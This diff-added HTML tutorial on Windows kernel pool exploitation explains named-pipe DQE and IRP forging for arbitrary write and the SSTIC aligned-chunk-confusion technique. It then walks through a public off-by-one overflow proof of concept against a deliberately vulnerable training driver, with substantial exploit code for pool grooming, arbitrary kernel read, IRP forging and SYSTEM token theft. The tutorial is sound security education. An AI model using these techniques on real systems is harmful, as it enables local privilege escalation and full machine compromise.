+    Irp             = forged IRP address;
+    SecurityContext = 0;
+    EntryType       = 0;              // buffered
+    QuotaInEntry    = DataSize - 1;   // one byte of quota left
+    DataSize        = write size;
+
+Forged IRP:
+    Flags          &amp;= ~IRP_DEALLOCATE_BUFFER | IRP_BUFFERED_IO | IRP_INPUT_OPERATION;
+                   // clears only IRP_DEALLOCATE_BUFFER; the input flags are kept/set here
+    AssociatedIrp  = source address;
+    UserBuffer     = destination address;
+    ThreadListEntry.Flink = ThreadListEntry.Blink = &amp;forged IRP's ThreadListEntry;
+</code></pre>
+<span class="theme-diagram" width="70%">
+  <img class="diagram-light" src="assets/diagrams/light/dqe_arb_write.svg" alt="Arbitrary write using a forged stalled write and IRP completion">
+  <img class="diagram-dark" src="assets/diagrams/dark/dqe_arb_write.svg" alt="Arbitrary write using a forged stalled write and IRP completion">
+</span>
+<p>The practical flow:</p>
+<ol>
+<li>Spray the pool with DQEs.</li>
+<li>Establish the arbitrary read using the above techniques.</li>
+<li>Use the leaked pointers to identify a DQE adjacent to the undercover DQE (<code>leaked_entry-&gt;Flink-&gt;Blink</code> gives its address) and find the pipe handle that owns it.</li>
+<li>Create a new buffered DQE entry holding an IRP on that handle by writing more than the pipe quota so the write stalls in the queue.</li>
+<li>Use the arbitrary read to find the new entry’s address (<code>leaked_entry-&gt;Flink</code>), then its IRP address, and dump the full IRP contents. We need to use the leaked IRP as otherwise, a fake one would fail <code>IofCompleteRequest</code>’s validation.</li>
+<li>Forge the stalled write DQE entry around the patched IRP: <code>QuotaInEntry = DataSize - 1</code> and <code>DataSize = write size</code>. The one-byte quota gap is the trigger, since the queue now looks like a write waiting for exactly one byte of room. Host the IRP in an <strong>unbuffered</strong> entry, because <code>IofCompleteRequest</code> tends to free the buffer it points at.</li>
+<li>Read a single byte from the pipe. <code>QuotaInEntry</code> climbs to <code>DataSize</code>, npfs decides the stalled write has room, and <code>IofCompleteRequest</code> completes the forged IRP. The kernel then copies from the address in <code>AssociatedIrp</code> to the address in <code>UserBuffer</code>, giving us arbitrary write :)</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="aligned-chunk-confusion-sstic"><a class="header" href="#aligned-chunk-confusion-sstic">Aligned Chunk Confusion (SSTIC)</a></h1>
+<p class="reading-meta">1450 words · 7 minutes</p>
+
+<h2 id="the-vulnerability"><a class="header" href="#the-vulnerability">The Vulnerability</a></h2>
+<p>The paper doesn’t target one specific bug, it assumes a generic heap overflow into the kernel pool where the attacker can rewrite the 1st and 4th byte of the next chunk’s <code>POOL_HEADER</code> with controlled values, that is the <code>PreviousSize</code> and <code>PoolType</code> fields. So a tiny 4 byte controlled overflow is enough here, since post 19H1 most of the other header fields went unused anyway. On top of that we also need to control the allocation and deallocation of the vulnerable object so we can spray and groom the pool reliably.</p>
+<p>The exploitation idea with just these bytes is to abuse the <code>CacheAligned</code> free path and redirect where the kernel actually frees the overwritten chunk, giving us an arbitrary free.</p>
+<h2 id="cache-aligned-in-pooltype-arbitrary-free-primitive"><a class="header" href="#cache-aligned-in-pooltype-arbitrary-free-primitive">Cache Aligned in PoolType (Arbitrary Free Primitive)</a></h2>
+<p>Some allocations are requested with the <code>CacheAligned</code> bit set in their <code>PoolType</code>. For those, the allocator pads the chunk and drops a <strong>second</strong> <code>POOL_HEADER</code> (the “aligned header”) right before the address that gets returned to the caller, and it stores the distance back to the real chunk start in this second header’s <code>PreviousSize</code> field (in <code>0x10</code> byte units, like every pool size field). So on free, the allocator needs to walk back to find where the actual chunk begins :</p>
+<p>For more on how cache aligned allocations lay out the two headers, check the <a href="#cachealigned">CacheAligned section</a> in the Pool Header chapter.</p>
+<pre><code class="language-c">if (AlignedHeader-&gt;PoolType &amp; 4) {   // CacheAligned bit set?
+    OriginalHeader = (QWORD *)AlignedHeader - AlignedHeader-&gt;PreviousSize * 0x10;
+}
+</code></pre>
+<p><code>AlignedHeader</code> is that second header sitting inside the alignment padding, <code>OriginalHeader</code> is which is used for free. The allocator does a
+simple substraction to compute the original chunk address and then later free it.</p>
+<p>The <code>if (AlignedHeader-&gt;PoolType &amp; 4)</code> branch check is still there, but some checks were removed in 19H1 and afterwards, so the walk back is basically blind now : whatever <code>PreviousSize</code> says, the kernel frees that address without validating the destination. This is why the overflow needs to touch exactly those two header bytes : we set the <code>CacheAligned</code> bit ourselves to enter this branch (a normal chunk with the bit unset just takes the regular free path), and we control <code>PreviousSize</code> to decide where it lands. Point it at planted data in the middle of the previous chunk and the allocator frees a fake chunk that never existed, or point it back by the exact size of the previous chunk and you get a Use-After-Free instead.</p>
+<h2 id="quota-pointer-process-overwrite-arbitrary-decrement-primitive"><a class="header" href="#quota-pointer-process-overwrite-arbitrary-decrement-primitive">Quota Pointer Process Overwrite (Arbitrary Decrement Primitive)</a></h2>
+<p>An allocation can charge its quota against the requesting process. When that happens, the kernel stores a pointer to the <code>_KPROCESS</code> in the <strong><code>ProcessBilled</code></strong> field of the <code>POOL_HEADER</code> (see <a href="#pool-header-structure">Pool Header Structure</a>), and on free it follows that pointer to decrement the process’s quota charge. An overflow that controls <code>ProcessBilled</code> used to give an arbitrary dereference here (the classic Quota Process Pointer Overwrite), which is exactly why the pointer is now encoded :</p>
+<pre><code>ProcessBilled = KPROCESS_ptr ^ ExpPoolQuotaCookie ^ chunk_addr
+</code></pre>
+<p>On free the kernel decodes it and validates the result (kernel-mode address, valid process header type), then decrements the quota counter in the decoded “process”. The <strong><code>ExpPoolQuotaCookie</code></strong> is generated at boot, so a blind overwrite decodes to garbage and bugchecks.</p>
+<p>But the validation only checks that the decoded pointer <em>looks</em> like a process object. If we can leak the <code>ExpPoolQuotaCookie</code> and know the address of our chunk, both of which an arbitrary read gives us, we can encode a pointer that decodes to any address we choose. Pointing it at a fake <code>_EPROCESS</code> (sprayed with the right header type) makes the checks pass, and the free then decrements a counter at an attacker-chosen address : an <strong>arbitrary decrementation primitive</strong>. The decrement amount is the quota charge, derived from the chunk’s size, so we control both where it lands and by how much.</p>
+<h2 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h2>
+<p>The paper’s exploit chains the arbitrary free into a <strong>ghost chunk</strong>, a fake chunk carved inside a still-allocated one that spans the vulnerable and overwritten chunks. From there the arbitrary read and write primitives are built.</p>
+<span class="theme-diagram" width="70%">
+  <img class="diagram-light" src="assets/diagrams/light/ghost_chunk.svg" alt="Ghost chunk carved inside the vulnerable and overwritten chunks">
+  <img class="diagram-dark" src="assets/diagrams/dark/ghost_chunk.svg" alt="Ghost chunk carved inside the vulnerable and overwritten chunks">
+</span>
+<ol>
+<li>Groom the pool so a controllable object sits right after the <strong>vulnerable chunk</strong>, then overflow its header with the <strong><code>CacheAligned</code></strong> bit set and <strong><code>PreviousSize</code></strong> pointing into the vulnerable chunk. The free computes <code>OriginalHeader = AlignedHeader - PreviousSize * 0x10</code>, so <code>PreviousSize = 0x15</code> walks back <code>0x150</code> bytes from the overwritten chunk’s header. For a <code>0x180</code> sized vulnerable chunk that is exactly offset <code>0x30</code> inside it, which is where we plant the fake header in the next step.</li>
+<li>Free the vulnerable chunk and reallocate it with a <a href="#pipe-attributes"><code>PipeAttribute</code></a> whose data plants our <strong>fake <code>POOL_HEADER</code></strong> at offset <code>0x30</code>, with <strong><code>BlockSize = 0x21</code></strong>. The replanting is needed because the original object’s data at that offset wasn’t ours, the reallocation gives us byte-exact control of the memory the redirected free will hit. The <code>BlockSize</code> is not random : it’s the size of the chunk that will actually be freed, and we want it easy to reuse. All sizes under <code>0x200</code> land in the LFH, so they are out. The smallest non-LFH allocation is <code>0x200</code>, a chunk of <code>0x210</code>. <code>0x210</code> uses the VS backend and is eligible for the <strong>Dynamic Lookaside</strong>, and its bucket can be enabled beforehand by spraying and freeing chunks of <code>0x210</code> bytes.</li>
+<li>Free the overwritten chunk. This triggers the <strong>cache aligned free</strong> : the kernel frees <code>OverwrittenChunkAddress - (0x15 * 0x10)</code>, which is <code>VulnerableChunkAddress + 0x30</code>, exactly where our fake <code>POOL_HEADER</code> sits. So the header used for this free is ours, and instead of the overwritten chunk the kernel frees a <code>0x210</code> chunk straight onto the <strong>Dynamic Lookaside</strong>. The overwritten chunk is now in a <strong>“lost” state</strong> as the  kernel thinks it’s freed.</li>
+</ol>
+<p>The <code>PipeAttribute</code> objects used in the next steps are created through <code>NtFsControlFile</code> with the <code>0x11003C</code> control code, and their value is read back with <code>0x110038</code> :</p>
+<pre><code class="language-c">HANDLE read_pipe;
+HANDLE write_pipe;
+char attribute[] = "attribute_name\00attribute_value";
+char output[0x100];
+NTSTATUS status;
+
+CreatePipe(&amp;read_pipe, &amp;write_pipe, NULL, 0);
+NtFsControlFile(write_pipe, NULL, NULL, NULL, &amp;status,
+                0x11003C, attribute, sizeof(attribute), output, sizeof(output));
+
+// read the attribute's value back, the kernel copies
+// AttributeValueSize bytes from AttributeValue to output
+char name[] = "attribute_name";
+NtFsControlFile(read_pipe, NULL, NULL, NULL, &amp;status,
+                0x110038, name, sizeof(name), output, sizeof(output));
+</code></pre>
+<p>Per the paper, the size of the allocation and the data are fully attacker controlled, and the <code>AttributeName</code> and <code>AttributeValue</code> pointers point at different offsets of this data field.</p>
+<ol start="4">
+<li>
+<p><strong>Leaking the content of the ghost chunk</strong> : the ghost chunk can now be reallocated with a <code>PipeAttribute</code> object. The ghost’s <code>PipeAttribute</code> structure lands right where the attribute placed in the vulnerable chunk reads its value from, since its <code>AttributeValue</code> was aimed into the ghost region on purpose. By reading the value of this pipe attribute, the data returned is the content of the ghost chunk’s <code>PipeAttribute</code>, so its contents are leaked : the address of the ghost chunk, and thus of the vulnerable chunk, is now known.</p>
+</li>
+<li>
+<p>To get the full <strong>arbitrary read</strong> : free the vulnerable chunk one more time and reallocate it with another <code>PipeAttribute</code>, this time aiming its data on top of the ghost chunk’s own <code>PipeAttribute</code> header. That header is what npfs follows when reading the ghost’s attribute, so rewriting it puts the ghost’s attribute structure under our control too. A <strong>new <code>PipeAttribute</code> is injected in the attribute linked list, and it is located in userland</strong> : the forged list pointers make the kernel follow the chain into our memory. Requesting the read of the ghost’s attribute now makes the kernel use the userland <code>PipeAttribute</code>, and controlling its <code>AttributeValue</code> / <code>AttributeValueSize</code> is the <strong>arbitrary read primitive</strong>.</p>
+</li>
+<li>
+<p>Overwrite the ghost header once more with the <strong><code>PoolQuota</code></strong> bit and a forged <strong><code>ProcessBilled</code></strong> pointing at a fake <code>_EPROCESS</code> sprayed with a Pipe Data Queue Entry. Freeing the <strong>ghost chunk</strong> now decrements an attacker-chosen counter.
+This means the Quota Pointer Process Overwrite attack can be used to get an arbitrary decrementation primitive. The <code>ExpPoolQuotaCookie</code> and the address of the ghost chunk can be recovered using the arbitrary read primitive.</p>
+</li>
+<li>
+<p>The first decrement lands on <strong><code>TOKEN-&gt;Privileges.Enabled</code></strong>, and a second pass on <strong><code>Privileges.Present</code></strong> (this one is checked since 1607). With <strong><code>SeDebugPrivilege</code></strong> set in both, our process can now open a SYSTEM process and inject into it.</p>
+</li>
+</ol>
+<div class="admonition note">
+<p class="admonition-title">Writeup Coming Soon</p>
+
+<p>Example writeup of this technique is coming soon.</p>
+
+</div>
+
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="off-by-one-pool-overflow-exploit"><a class="header" href="#off-by-one-pool-overflow-exploit">Off-By-One Pool Overflow Exploit</a></h1>
+<p class="reading-meta">2265 words · 11 minutes</p>
+
+<p>This writeup is based on the exploit PoC for the <a href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/master/vulnerable_driver/Overfl0w.cpp">vulnerable driver (Overfl0w.cpp)</a> which is written <a href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/master/exploits/vuln_driver_al20c.cpp">here (vuln_driver_al20c.cpp)</a>.</p>
+<h2 id="vulnerability"><a class="header" href="#vulnerability">Vulnerability</a></h2>
+<pre><code class="language-c">NTSTATUS Al20c(size_t Size)
+{
+    char* buf = (char*)ExAllocatePoolWithTag(NonPagedPoolNx, Size, 'AAAA');
+    for (int i = 0; i &lt;= Size &amp;&amp; buf; i++)
+        buf[i] = ' ';
+    return STATUS_SUCCESS;
+}
+</code></pre>
+<p>There is a one byte overflow as the for loop is writing one byte more than the allocated Size variable</p>
+<h2 id="exploit"><a class="header" href="#exploit">Exploit</a></h2>
+<p>For the allocations we deliberately go with the segment backend allocator (page-aligned large allocations) by making the DQE allocation sizes whole page multiples (0x2000, 0x4000, 0x1000) so that our chunks have no pool header metadata inside them and every entry starts exactly at a page boundary. This way the one byte overflow lands straight on the first byte of the next chunk, which is the Flink of that DQE, and since the cover entry is page aligned (something like 0x…000) the overflow turns it into 0x…020, pointing 0x20 bytes inside the cover chunk where our undercover entry will sit.</p>
+<p>With only a single byte to overflow we are stuck with the limited overflow technique where we just redirect the Flink of the victim entry as shown in the <a href="#3-arbitrary-read-with-limited-control-flink-only">3rd technique</a> to get an arbitrary read first. For that we need to groom the heap in a way so that it’s predictable where our overwrite occurs and that the redirected Flink lands on a cover/undercover entry we control.</p>
+<pre><code class="language-c">#define NP_HEADER_SIZE 0x30
+#define FIRST_ENTRY_SIZE (0x2000-NP_HEADER_SIZE) //FIRST_ENTRY is not very important
+#define SECOND_ENTRY_SIZE (0x4000-NP_HEADER_SIZE)
+#define THIRD_ENTRY_SIZE (0x1000-NP_HEADER_SIZE)
+</code></pre>
+<p>The DQE for an individual pipe here using these sizes looks like this :</p>
+<span class="theme-diagram" width="80%">
+  <img class="diagram-light" src="assets/diagrams/light/vuln20_dqe.svg" alt="DQE layout of a single pipe using the three entry sizes">
+  <img class="diagram-dark" src="assets/diagrams/dark/vuln20_dqe.svg" alt="DQE layout of a single pipe using the three entry sizes">
+</span>
+<p>Next we spray and groom the heap memory in such a way that a hole is created between two middle DQEs :</p>
+<span class="theme-diagram" width="80%">
+  <img class="diagram-light" src="assets/diagrams/light/vuln20_heap_layout.svg" alt="Heap layout with a hole carved between two middle DQEs">
+  <img class="diagram-dark" src="assets/diagrams/dark/vuln20_heap_layout.svg" alt="Heap layout with a hole carved between two middle DQEs">
+</span>
+<p>The third entry (cover) would be crafted in such a way with the undercover entry in its data and the third entry would look like the following so that if the Flink last byte is overwritten by 0x20 then it would point to the undercover entry instead of cover entry now</p>
+<span class="theme-diagram" width="85%">
+  <img class="diagram-light" src="assets/diagrams/light/vuln20_undercover_on_cover.svg" alt="Undercover DQE overlaying the cover entry header tail and data">
+  <img class="diagram-dark" src="assets/diagrams/dark/vuln20_undercover_on_cover.svg" alt="Undercover DQE overlaying the cover entry header tail and data">
+</span>
+<ul>
+<li>IRP starts in Data of Cover entry which is why the exploit creates the right entries in the following way :</li>
+</ul>
+<pre><code class="language-c">    printf("Creating the RIGHT entries\n");
+    char victim_data[THIRD_ENTRY_SIZE];
+    DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)victim_data;
+    memset(dqe, 0, sizeof(*dqe));
+    dqe-&gt;DataSize = THIRD_ENTRY_SIZE + 1;
+
+    for (int i = 0; i &lt; pipe_pool.size(); i++) {
+        WriteFile(pipe_pool[i].Write, &amp;dqe-&gt;Irp, THIRD_ENTRY_SIZE, &amp;res, 0);
+    }
+</code></pre>
+<p>The undercover entry starts at cover + 0x20 which is 0x10 bytes before the cover’s data, so writing from <code>&amp;dqe-&gt;Irp</code> makes the stack <code>DATA_QUEUE_ENTRY</code> line up field by field with the undercover header : stack <code>Irp</code> lands on undercover <code>Irp</code>, stack <code>DataSize</code> lands on undercover <code>DataSize</code> and so on. If we had passed <code>dqe</code> instead, everything would be shifted by 0x10 and <code>undercover.DataSize</code> would read the stack <code>SecurityContext</code> (0), which means no overread and no way to detect the corrupted pipe.</p>
+<p>The DataSize is incremented by one which will help us in identifying the imposter pipe here in the following way afterwards</p>
+<pre><code class="language-c">for (auto&amp; p : pipe_pool) {
+    PeekNamedPipe(p.Read, buf, TOTAL_DATA_SIZE + 1, &amp;bytes_read, 0, 0);
+    if (bytes_read == TOTAL_DATA_SIZE + 1) {
+        g_victim_pipe = &amp;p;
+        printf("Overflown data entry found\n");
+        break;
+    }
+}
+</code></pre>
+<p>Now the overflown entry with the overwritten Flink will point to the undercover entry.</p>
+<span class="theme-diagram" width="80%">
+  <img class="diagram-light" src="assets/diagrams/light/vuln20_before_after_overflow.svg" alt="Queue walk before and after the one byte overflow">
+  <img class="diagram-dark" src="assets/diagrams/dark/vuln20_before_after_overflow.svg" alt="Queue walk before and after the one byte overflow">
+</span>
+<p>Now the exploit grooms the pool in such a way that the undercover entry Flink is the following :</p>
+<pre><code class="language-c">Flink = EntryType | QuotaInEntry
+</code></pre>
+<p>The Undercover flink should point to a userdata address which the exploit uses:</p>
+<pre><code class="language-c">#define THIRD_ENTRY_SIZE (0x1000-NP_HEADER_SIZE)
+#define USER_DATA_ENTRY_ADDR ((long long)THIRD_ENTRY_SIZE&lt;&lt;32)
+</code></pre>
+<p>This is done because in a buffered DQE, initially the QuotaInEntry is the same as the DataSize which is currently THIRD_ENTRY_SIZE so we can make use of it to allocate some data in userspace at <code>EntryType | QuotaInEntry</code></p>
+<h2 id="arbitrary-read"><a class="header" href="#arbitrary-read">Arbitrary Read</a></h2>
+<p>The exploit does the following in the beginning :</p>
+<pre><code class="language-c">    if (VirtualAlloc((PVOID)USER_DATA_ENTRY_ADDR, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != (PVOID)USER_DATA_ENTRY_ADDR) {
+        printf("Couldn't allocate base address %p\n", USER_DATA_ENTRY_ADDR);
+        return;
+    }
+</code></pre>
+<p>This would be helping us in getting arbitrary read. We forge a DQE with an IRP from userspace. That DQE is the Flink to the undercover DQE entry. Refer to the <a href="#3-arbitrary-read-with-limited-control-flink-only">3rd technique</a> mentioned in the Data Queue Entries chapter.</p>
+<pre><code class="language-c">void PrepareDataEntryForRead(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint64_t read_address) {
+    memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
+    dqe-&gt;EntryType = 1;
+    dqe-&gt;DataSize = -1;
+    dqe-&gt;Irp = irp;
+    irp-&gt;AssociatedIrp = (PVOID)read_address;
+}
+
+void ReadMem(uint64_t addr, size_t len, char* data) {
+    static char* buf = (char*)malloc(TOTAL_DATA_SIZE + 1 + 0x5000);
+    DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
+    DWORD read;
+    PrepareDataEntryForRead(dqe, (IRP*)(USER_DATA_ENTRY_ADDR + 0x1000), addr);
+    PeekNamedPipe(g_victim_pipe-&gt;Read, buf, TOTAL_DATA_SIZE + 1 + len, &amp;read, 0, 0);
+    memcpy(data, buf + TOTAL_DATA_SIZE + 1, len);
+}
+</code></pre>
+<p>Now we need to leak the next chunk address which should most likely be the DQE because of how we groomed the pool. We can easily do that with the undercover entry as it already covers some (0x21 bytes) part of the data of the next chunk. We can leak the next chunk Flink and then use the arbitrary read to read the value of next_chunk_flink-&gt;Blink. Reading the Blink works because of the safe unlink invariant, <code>next_chunk-&gt;Flink-&gt;Blink</code> must point back to <code>next_chunk</code> itself, so reading 8 bytes at the leaked pointer + 8 hands us the exact address of the next chunk without any guessing.</p>
+<pre><code class="language-c">    DATA_QUEUE_ENTRY* next_chunk_flink = (DATA_QUEUE_ENTRY*)*(uint64_t*)&amp;buf[TOTAL_DATA_SIZE - 0x20];
+    printf("Leaked Flink of next chunk: %p\n", next_chunk_flink);
+
+    uint64_t next_chunk_addr;
+    ReadMem((uint64_t)&amp;next_chunk_flink-&gt;Blink, 8, (char*)&amp;next_chunk_addr);
+</code></pre>
+<p><code>buf[TOTAL_DATA_SIZE - 0x20]</code> is not some random offset by the way. The undercover entry claimed <code>0xFD1</code> bytes of data but only <code>0xFB0</code> bytes exist inside the cover chunk (its data starts at cover+0x50 and the chunk is exactly one page), so the last 0x21 bytes of the peek buffer are actually the first bytes of the next physical chunk. <code>TOTAL_DATA_SIZE - 0x20</code> is just <code>(TOTAL_DATA_SIZE + 1) - 0x21</code>, the first of those spilled bytes, which is where the next chunk’s <code>Flink</code> begins.</p>
+<p>And next we get our own cover DQE entry address in memory using the next chunk address:</p>
+<pre><code class="language-c">    uint64_t current_chunk_addr = next_chunk_addr - THIRD_ENTRY_SIZE - NP_HEADER_SIZE;
+</code></pre>
+<h2 id="arbitrary-write"><a class="header" href="#arbitrary-write">Arbitrary Write</a></h2>
+<p>Now we need to create a stalled write DQE entry.</p>
+<p>We created a pipe with the following :</p>
+<pre><code class="language-c">       w = CreateNamedPipe(
+            L"\\\\.\\pipe\\exploit_20",
+            PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
+            PIPE_TYPE_BYTE | PIPE_WAIT,
+            PIPE_UNLIMITED_INSTANCES,
+            TOTAL_DATA_SIZE,
+            TOTAL_DATA_SIZE,
+            0,
+            0);
+</code></pre>
+<p>so the pipe quota would most likely be <code>TOTAL_DATA_SIZE</code> so if we create another DQE of any size for eg. <code>FIRST_ENTRY_SIZE</code> then that DQE would be in WAITING state for the victim pipe.
+The exploit does this through a dedicated thread, because a blocking <code>WriteFile</code> into a full pipe never returns and we need the main thread free to keep using the arbitrary read :</p>
+<pre><code class="language-c">DWORD WINAPI ThreadedWriter(void* arg) {
+    char* buf = (char*)arg;
+    DWORD res;
+
+    WriteFile(g_victim_pipe-&gt;Write, buf, FIRST_ENTRY_SIZE, &amp;res, NULL);
+
+    Sleep(-1);
+    return 0;
+}
+</code></pre>
+<p>and in main :</p>
+<pre><code class="language-c">    printf("Creating an entry with size greater than the available pipe quota\n");
+    CreateThread(0, 0, ThreadedWriter, buf, 0, 0); //we could have used overlapped io
+    Sleep(2000);
+</code></pre>
+<p>The <code>Sleep(2000)</code> just gives the writer thread time to block on the quota, and the <code>Sleep(-1)</code> inside the thread keeps it blocked forever so its IRP stays parked inside the DQE for us to dump. The comment in the exploit mentions we could have used overlapped IO instead of a thread, but in practice they found the thread approach more reliable.</p>
+<p>Now after creation of this new stalled DQE, we can use the cover DQE entry address, read its Flink and get the new DQE Entry address too. But what we actually want from this entry is its IRP data, because that’s what we use to extract the current process and system process data from their <code>EPROCESS</code> Structures via the <code>ThreadListEntry</code>. Normally a buffered entry has an empty Irp field, the data is just copied inline and the write IRP gets completed and freed right away, so there would be nothing to dump. But this entry is different because of the quota mechanism : since the write exceeds the pipe quota in blocking mode, the write IRP cannot be completed yet, so npfs parks it inside the DQE instead. This is exactly why we write more than the quota, a normal in-quota write would just give us another Irp-less entry.
+We could use an unbuffered entry here too but buffered entries are easier to create.</p>
+<pre><code class="language-c">    ReadMem((uint64_t)irp-&gt;ThreadListEntry.Flink + 0x38, 8, (char*)&amp;cp_thread_list_head);
+    current_process = cp_thread_list_head - OFFSET_EPROCESS_THREADLISTHEAD;
+    ReadMem(current_process + OFFSET_EPROCESS_PID, 8, (char*)&amp;current_process_id);
+    if (current_process_id != GetCurrentProcessId())
+        g_setoff++;
+
+    current_process = cp_thread_list_head - OFFSET_EPROCESS_THREADLISTHEAD
+    system_process = GetProcessById(current_process, 4);
+</code></pre>
+<p>Current process token is leaked using the arbitrary read primitive and then we traverse the doubly linked list of the <code>EPROCESS</code> structure to get the System Process token too (PID: 4).</p>
+<p>Now we need to forge an <code>IRP</code> for unbuffered entry for arbitrary write primitive to overwrite the Current Process Token with the System Process Token.</p>
+<pre><code class="language-c">void PrepareWriteIRP(IRP* irp, PVOID thread_list, PVOID source_address, PVOID destination_address)
+{
+    irp-&gt;Flags |= IRP_BUFFERED_IO | IRP_INPUT_OPERATION;
+    irp-&gt;AssociatedIrp = source_address;
+    irp-&gt;UserBuffer = destination_address;
+    irp-&gt;ThreadListEntry.Flink = (LIST_ENTRY*)(thread_list);
+    irp-&gt;ThreadListEntry.Blink = (LIST_ENTRY*)(thread_list);
+}
+
+PrepareWriteIRP(irp, thread_list, (PVOID)(system_process + OFFSET_EPROCESS_TOKEN), (PVOID)(current_process + OFFSET_EPROCESS_TOKEN));
+</code></pre>
+<p>The whole write primitive is just IRP semantics here, when a buffered input IRP completes, <code>IopCompleteRequest</code> copies <code>AssociatedIrp</code> (SystemBuffer) to <code>UserBuffer</code> for us, so we set the source to the system token and the destination to our own token and let the kernel do the copy.</p>
+<p>Now we need to add this unbuffered DQE entry with the forged IRP to the pipe using NtFsControlFile api and then we need to leak its address as well using the following:</p>
+<pre><code class="language-c">    IO_STATUS_BLOCK isb;
+    NtFsControlFile(g_victim_pipe-&gt;Write, 0, 0, 0, &amp;isb, 0x119FF8, irp, 0x1000, 0, 0);
+    ReadMem(next_entry, 8, (char*)&amp;unbuffered_entry);
+</code></pre>
+<p>Next we need to leak the address of the Forged IRP we just created from the Unbuffered entry in memory :</p>
+<pre><code class="language-c">    ReadMem(unbuffered_entry + offsetof(DATA_QUEUE_ENTRY, Irp), 8, (char*)&amp;unbuffered_irp_addr);
+    ReadMem(unbuffered_irp_addr + offsetof(IRP, AssociatedIrp), 8, (char*)&amp;forged_irp_addr);
+</code></pre>
+<p>One thing to keep in mind, we don’t reuse the real stalled IRP itself, we only use it as a template. <code>IofCompleteRequest</code> frees the IRP when it’s done, so completing the original would free an IRP that ThreadedWriter is still blocked on. The forged bytes are copied into kernel memory by the NtFsControlFile call (that’s what the fsctl IRP’s <code>AssociatedIrp</code> points at) and that copy is what we complete and let get freed.</p>
+<p>Now this forged <code>IRP</code> would be used to overwrite the undercover Flink again for getting arbitrary write, so the next thing we do is a ReadFile call which will try to complete the IO using IofCompleteRequest with our forged IRP which will overwrite our current process token with the system token and we would gain privileges.</p>
+<pre><code class="language-c">    dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
+    PrepareDataEntryForWrite(dqe, (IRP*)forged_irp_addr, ARBITRARY_WRITE_SIZE);
+
+    thread_list[0] = thread_list[1] = forged_irp_addr + offsetof(IRP, ThreadListEntry.Flink);
+
+    ReadFile(g_victim_pipe-&gt;Read, buf, ARBITRARY_WRITE_SIZE, &amp;res, 0);
+</code></pre>
+<p><code>PrepareDataEntryForWrite</code> dresses the userspace fake DQE up as a stalled write (<code>EntryType = 0</code>, <code>DataSize = 8</code>, <code>QuotaInEntry = 0</code>, <code>Irp = forged_irp_addr</code>) so the same quota mechanism that parked the real IRP now completes our forged one. <code>Flink</code> is set to itself so that any unlink against the fake entry is a no-op.</p>
+<h3 id="irps--threadlists"><a class="header" href="#irps--threadlists">IRPs &amp; ThreadLists</a></h3>
+<p>Every IRP carries a <code>ThreadListEntry</code>, a <code>LIST_ENTRY</code> the kernel uses to keep a per thread list of the IRPs owned by that thread (<code>ETHREAD.IrpList</code>). On completion the IRP gets unlinked from that list, and the unlink writes through the neighbors too :</p>
+<pre><code class="language-c">Irp-&gt;ThreadListEntry.Flink-&gt;Blink = Irp-&gt;ThreadListEntry.Blink;
+Irp-&gt;ThreadListEntry.Blink-&gt;Flink = Irp-&gt;ThreadListEntry.Flink;
+</code></pre>
+<p>Our forged IRP is a copy of the real stalled IRP at a different address, so its <code>Flink</code>/<code>Blink</code> point into the blocked thread’s real list while the neighbors no longer point back at it. Completing it with these stale pointers would corrupt a live list and bugcheck. The fix : give the forged IRP its own private list in userland. In <code>PrepareWriteIRP</code> both pointers are set to a <code>thread_list</code> array, and once <code>forged_irp_addr</code> is leaked the array is filled with <code>&amp;forged_irp-&gt;ThreadListEntry</code> :</p>
+<pre><code class="language-c">thread_list[0] = thread_list[1] = forged_irp_addr + offsetof(IRP, ThreadListEntry.Flink);
+</code></pre>
+<p>Now the unlink validation passes and the writes land inside our own array, the real <code>IrpList</code> of the blocked thread is never touched.</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+
+            </nav>
+
+        </div>
+
+        <template id=fa-eye><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></template>
